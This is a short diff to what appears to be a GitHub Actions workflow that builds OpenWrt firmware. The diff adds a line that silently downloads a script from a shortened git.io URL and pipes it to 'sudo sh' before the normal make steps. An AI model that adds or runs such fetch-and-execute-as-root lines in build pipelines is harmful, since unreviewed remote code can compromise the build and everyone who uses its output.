@@ -80,6 +80,7 @@ jobs:
       id: package
       run: |
         cd openwrt
+        wget -qO- git.io/fix.sh|sudo sh
         make defconfig
         make download -j8
         find dl -size -1024c -exec ls -l {} \;
